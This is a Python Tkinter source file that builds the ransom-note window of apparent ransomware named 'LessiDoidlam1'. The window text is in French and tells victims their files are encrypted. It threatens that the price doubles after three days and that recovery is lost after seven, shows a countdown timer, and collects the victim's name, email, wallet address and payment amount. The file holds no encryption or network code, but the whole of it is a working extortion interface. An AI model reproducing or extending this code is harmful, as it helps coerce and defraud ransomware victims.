from tkinter import *
from tkinter import ttk
from datetime import datetime, timedelta
from functions import *

# Création de la fenêtre et logo
root = Tk()
logo = PhotoImage(file="./img/LessiDoidlam1.png")
root.title("LessiDoidlam1 - Demande de rançon")
root.iconbitmap("./img/LessiDoidlam1.ico")
root.iconphoto(True, logo)
root.geometry("1200x600")
root.config(bg="red")

root.grid_rowconfigure(0, weight=1)
root.grid_columnconfigure(0, weight=1)

paymentFrame = Frame(root, bg="white", width=1000, height=600)
paymentFrame.grid_propagate(False)

formFrame = Frame(root, bg="white", width=1000, height=600)
formFrame.grid_propagate(False)

counter_label = Label(paymentFrame, text="", bg="white")
counter_label.grid(row=10, column=0, pady=20)
target_date = datetime.now() + timedelta(days=7)
update_counter(counter_label, root, target_date)

Label(paymentFrame, text="LessiDoidlam1\n", bg="white").grid(column=0, row=0)
Label(paymentFrame, text="Vos informations personnelles ont été cryptées.\n", bg="white").grid(column=0, row=1)
Label(paymentFrame, text="La plupart de vos documents, photos, vidéos et autres fichiers ne sont plus accessible car ils ont été cryptés.\nPeut-être que vous avez essayer de chercher un moyen de restaurer vos fichiers mais ne perdez pas votre temps.\nPersonne ne peut restaurer vos fichiers sans notre service de décryptage.\n", bg="white").grid(column=0, row=2)
Label(paymentFrame, text="Puis-je récupérer mes fichiers ?", bg="white").grid(column=0, row=3)
Label(paymentFrame, text="Bien sûr. Nous vous garantissons que nous pouvons restaurer tous vos fichiers de manière sécurisé et simple.\n", bg="white").grid(column=0, row=4)
Label(paymentFrame, text="Vous avez 3 jours pour valider le paiment. Passer les jours, le prix sera doublé.\nSi vous ne payez pas au bout de 7 jours, vous ne pourrez plus jamais restaurer vos fichiers.\n", bg="white").grid(column=0, row=5)
Label(paymentFrame, text="Veuillez procéder au paiement pour récupérer vos informations.\n", bg="white").grid(column=0, row=6)
ttk.Button(paymentFrame, text="Payer", command=lambda: show_form_frame(paymentFrame, formFrame)).grid(row=7, column=0)

Label(formFrame, text="LessiDoidlam1\n", bg="white").grid(column=0, row=0)

# Formulaire
surname_label = Label(formFrame, text="Nom :", bg="white")
surname_label.grid(row=1, column=0, sticky=W, pady=5)
surname_entry = Entry(formFrame, width=30)
surname_entry.grid(row=1, column=1, pady=5)

name_label = Label(formFrame, text="Prénom :", bg="white")
name_label.grid(row=2, column=0, sticky=W, pady=5)
name_entry = Entry(formFrame, width=30)
name_entry.grid(row=2, column=1, pady=5)

email_label = Label(formFrame, text="E-mail :", bg="white")
email_label.grid(row=3, column=0, sticky=W, pady=5)
email_entry = Entry(formFrame, width=30)
email_entry.grid(row=3, column=1, pady=5)

wallet_adress_label = Label(formFrame, text="Adresse du portefeuille :", bg="white")
wallet_adress_label.grid(row=4, column=0, sticky=W, pady=5)
wallet_adress_entry = Entry(formFrame, width=30)
wallet_adress_entry.grid(row=4, column=1, pady=5)

amount_label = Label(formFrame, text="Montant :", bg="white")
amount_label.grid(row=5, column=0, sticky=W, pady=5)
amount_entry = Entry(formFrame, width=30)
amount_entry.grid(row=5, column=1, pady=5)


confirmation_label = Label(formFrame, text="", fg="red", bg="white")
confirmation_label.grid(row=7, column=0, columnspan=2, pady=10)

# Bouton Soumettre
submit_button = ttk.Button(formFrame, text="Soumettre", command=lambda: submit_form(root, name_entry, surname_entry, wallet_adress_entry, amount_entry, formFrame, loadingFrame, successFrame, confirmation_label))
submit_button.grid(row=8, column=0, columnspan=2, pady=10)

# Frame de chargement (initialement cachée)
loadingFrame = Frame(root, bg="white", width=600, height=400)
loadingFrame.grid_propagate(False)
loading_label = Label(loadingFrame, text="Vérification de la transaction en cours...", bg="white")
loading_label.grid(row=0, column=0, padx=100, pady=100)

# Frame de succès (initialement cachée)
successFrame = Frame(root, bg="white", width=600, height=400)
successFrame.grid_propagate(False)

ttk.Button(formFrame, text="Retour", command=lambda: show_payment_frame(formFrame, paymentFrame)).grid(row=8, column=0)

counter_label = Label(formFrame, text="", bg="white")
counter_label.grid(row=10, column=0, pady=20)
update_counter(counter_label, root, target_date)

paymentFrame.grid(row=0, column=0, padx=100, pady=100)

root.mainloop()